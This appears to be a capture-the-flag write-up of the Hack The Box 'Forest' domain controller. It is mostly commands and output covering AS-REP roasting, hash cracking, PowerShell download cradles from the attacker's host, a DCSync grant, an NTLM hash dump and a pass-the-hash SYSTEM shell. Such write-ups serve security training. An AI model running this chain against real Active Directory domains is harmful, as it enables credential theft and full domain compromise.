```
10.10.10.161	forest.htb
```
nmap
```
nmap -Pn -v -p 88,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_10.10.10.161.txt 10.10.10.161
```
```
PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-28 07:05:17Z)
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m49s, deviation: 4h37m08s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-12-27T23:05:19-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-28T07:05:21
|_  start_date: 2021-12-28T07:02:42


```
1: Try smb login:
```
smbclient -L \\10.10.10.161
```
Can anonymous login but no shares
```
smbclient -L \\10.10.10.161
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```
2: enumerate smb.
```
enum4linux -a 10.10.10.161 | tee enumout.txt

```
users avaliable (filter out those users that lack proper name)
```
user:[Administrator] rid:[0x1f4]
user:[krbtgt] rid:[0x1f6]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
copy & paste to user.txt and format the names using below command
```
cat user.txt| cut -d"[" -f2 |cut -d"]" -f1
```
3: try to crack username/username -- failed
```
crackmapexec smb 10.10.10.161 -u user.txt -p user.txt
```
4: try usernames on kerberos -> to find kerberoseable users -- saw krb5asrep for svc-alfresco
```
for user in $(cat user.txt);do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user};done
```
```
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c874f2496f524e0751d36a7a53b213b0$278b07e1494aabf4197f3967fdf6b5a383134823e567dcbbcf9a4fd5cf4aa34df5fc183aee856f1ee8957f9c239953b0314dee8bc00cf074bda5ef5454200d906ba4800e43c25d80c153b57b37f699a4079d1d799569b10c886147133148844b284e3594649a6b7eccb6be4cf4bd0c6b92ca5f2711fbc17531d7931fb64a432982a333b0128ef6ed0053360cad923dc6a54b663b3d1feee0c83f929f256a0581f8611ee376388446f577b8cf0ca1118b840a2cc2832cfb9a6c011a8264a91b72c848e2f92b14ca18349c64e3405cc9140ca2cb870072a96f981d64b8d9ecf3b8
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

```
5: save the hash, save as krb5asrep.svc-alfresco
```
vi krb5asrep.svc-alfresco
```
6: crack the krb5asrep using hashcat -> name/pwd: svc-alfresco/s3rvice
```
hashcat -m 18200 krb5asrep.svc-alfresco /usr/share/wordlists/rockyou.txt --force
```
```
$krb5asrep$23$svc-alfresco@HTB:c874f2496f524e0751d36a7a53b213b0$278b07e1494aabf4197f3967fdf6b5a383134823e567dcbbcf9a4fd5cf4aa34df5fc183aee856f1ee8957f9c239953b0314dee8bc00cf074bda5ef5454200d906ba4800e43c25d80c153b57b37f699a4079d1d799569b10c886147133148844b284e3594649a6b7eccb6be4cf4bd0c6b92ca5f2711fbc17531d7931fb64a432982a333b0128ef6ed0053360cad923dc6a54b663b3d1feee0c83f929f256a0581f8611ee376388446f577b8cf0ca1118b840a2cc2832cfb9a6c011a8264a91b72c848e2f92b14ca18349c64e3405cc9140ca2cb870072a96f981d64b8d9ecf3b8:s3rvice

```
7: login using winrm [ saw remote port 5985 which by default is wondows remote management port]
```
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
```
┌──(kali㉿kali)-[~/Desktop/htb_prep/forest]
└─$ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
alternative, use impact-psexec to login (impact use smb to login) -> fialed, need admin rights to login
```
impacket-psexec svc-alfresco:'s3rvice'@forest.htb 
```

8: escalate previldge.
make sure apache is running
```
sudo service apache2 start
```
check apache logs:
```
sudo tail -f /var/log/apache2/access.log
```
load jaws: (just another windows enum script)
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/jaws.txt')
```
since result couldbe long, download to local linux to read:
```
download c:\windows\tasks\jawchecks.txt
```
from the result that i know svc-alfresco belongs to Service Accounts
```
Username: svc-alfresco
Groups:   Domain Users Service Accounts

```
9: load powerup (just like jaws, but will tell more pratical info to escalet the prev) -> cannt do anything here.
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/up.txt')
```
10: enumerate windows AD:
~1: load powerview: (powerview has lots of additional functions to enumerate the domain)
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/view.txt')
```
notes: TREE_ROOT->htb.local is the root domain; PRIMARY->I'm currently in this source domain.
```

Forest                  : htb.local
DomainControllers       : {FOREST.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : FOREST.htb.local
RidRoleOwner            : FOREST.htb.local
InfrastructureRoleOwner : FOREST.htb.local
Name                    : htb.local

SourceName        : htb.local
TargetName        : htb.local
TargetNetbiosName : HTB
Flags             : IN_FOREST, TREE_ROOT, PRIMARY, NATIVE_MODE
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : 0
TargetSid         : S-1-5-21-3072663084-364016917-1341370565
TargetGuid        : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab

```
11, run bloodhound and adjust bloodhound to target htb.local.
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://10.10.14.37/hound.txt')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd c:\windows\tasks
*Evil-WinRM* PS C:\windows\tasks> ls


    Directory: C:\windows\tasks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/28/2021   5:50 PM          15241 20211228175030_BloodHound.zip
-a----       12/27/2021  11:46 PM         227596 jawchecks.txt
-a----       12/28/2021   5:50 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----       12/27/2021  11:57 PM            520 upchecks.txt


*Evil-WinRM* PS C:\windows\tasks> download 20211228175030_BloodHound.zip
Info: Downloading C:\windows\tasks\20211228175030_BloodHound.zip to 20211228175030_BloodHound.zip

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\windows\tasks> 

```
from bloddhound, search for myself which is svc-alfresco
noticed that svc-alfresco -> SERVICE ACCOUNTS -> priviledged it accounts -> ACCOUNT OPERATORS -> has GenericAll on many grps (everytime check outbound control right first, if dont have, then check 'first degree membership')

Set starting point as ACCOUNT OPERATORS, look for path to domian admin
Noticed: ACCOUNT OPERATORS -> GenericAll ONEXCAHNGE WINDOWS PERMISSSIONS -> has WriteDacl on HTB.LOCAL -> Contains Domain Admin.

Step 1: abuse ACCOUNT OPERATORS -> GenericAll on EXCAHNGE WINDOWS PERMISSSIONS 
~ GenericAll means i can add any user to EXCHANGE WINDOWS PERMISSIONS, 
~ Since i only have svc-alfresco credential, i'll add svc-alfresco to EXCHANGE WINDOWS PERMISSION.
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain

```
```
*Evil-WinRM* PS C:\users\administrator> net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\users\administrator> net group "EXCHANGE WINDOWS PERMISSIONS" /domain
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
svc-alfresco
The command completed successfully.

*Evil-WinRM* PS C:\users\administrator> 

```
Step 2: abuse EXCAHNGE WINDOWS PERMISSSIONS -> has WriteDacl on HTB.LOCAL. follow bloodhound instractions 
(at first, didnt work, reason is didnt see set -domain, 
first check, do i still have permissions, am i still part of the group, no, then to add in again
again, didnt work, altho i have permissions, try convert htb.local to LDAP syntax, which is htb.local -> "DC=htb,DC=local")
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -PrincipalIdentity svc-alfresco -Verbose

```
```
*Evil-WinRM* PS C:\users\administrator> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force 
*Evil-WinRM* PS C:\users\administrator> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
*Evil-WinRM* PS C:\users\administrator> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -PrincipalIdentity svc-alfresco -Verbose
Verbose: [Get-Domain] Using alternate credentials for Get-Domain
Verbose: [Get-Domain] Extracted domain 'htb.local' from -Credential
Verbose: [Get-DomainSearcher] search base: LDAP://FOREST.htb.local/DC=htb,DC=local
Verbose: [Get-DomainSearcher] Using alternate credentials for LDAP connection
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=svc-alfresco)(name=svc-alfresco)(displayname=svc-alfresco))))
Verbose: [Get-Domain] Using alternate credentials for Get-Domain
Verbose: [Get-Domain] Extracted domain 'htb.local' from -Credential
Verbose: [Get-DomainSearcher] search base: LDAP://FOREST.htb.local/DC=htb,DC=local
Verbose: [Get-DomainSearcher] Using alternate credentials for LDAP connection
Verbose: [Get-DomainObject] Extracted domain 'htb.local' from 'DC=htb,DC=local'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainSearcher] Using alternate credentials for LDAP connection
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=DC=htb,DC=local)))
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=htb,DC=local

```
12: run impack on local linux
```impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@forest.htb -dc-ip 10.10.10.161
```
```
kali㉿kali)-[~/Desktop/htb_prep/forest]
└─$ impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@forest.htb -dc-ip 10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:449a0904cdf152ae9e679ded9c7bb30d:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::

```
Login as admin using impact psexec to pass the hash (pth)
```
impacket-psexec administrator@forest.htb -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
```
kali㉿kali)-[~/Desktop/htb_prep/forest]
└─$ impacket-psexec administrator@forest.htb -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on forest.htb.....
[*] Found writable share ADMIN$
[*] Uploading file cjSlLkwK.exe
[*] Opening SVCManager on forest.htb.....
[*] Creating service YxQa on forest.htb.....
[*] Starting service YxQa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```
```
type c:\users\administrator\desktop\root.txt
ipconfig
```
```
──(kali㉿kali)-[~/Desktop/htb_prep/forest]
└─$ impacket-psexec administrator@forest.htb -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on forest.htb.....
[*] Found writable share ADMIN$
[*] Uploading file cjSlLkwK.exe
[*] Opening SVCManager on forest.htb.....
[*] Creating service YxQa on forest.htb.....
[*] Starting service YxQa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
ipconfied47caa88211e690c3a5c7b0d6b486e9

C:\Windows\system32>ipconfig
b"'ipconfigipconfig' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>ip a
b"'ip' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>

```




